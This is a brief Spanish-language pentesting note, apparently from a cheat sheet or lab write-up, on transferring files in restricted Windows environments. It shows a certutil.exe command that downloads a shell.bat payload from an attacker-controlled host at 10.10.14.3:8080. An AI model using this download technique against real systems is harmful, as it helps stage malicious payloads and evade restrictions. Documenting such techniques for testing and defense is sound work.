### Traspaso de archivos restringido
Si nos vemos en un entorno restringido para el traspaso de archivos, certutil.exe puede ser usado para transmitirlos. Certutil se emplea para manejar certificados, pero tiene una disrupción que permite descargar cosas

    certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
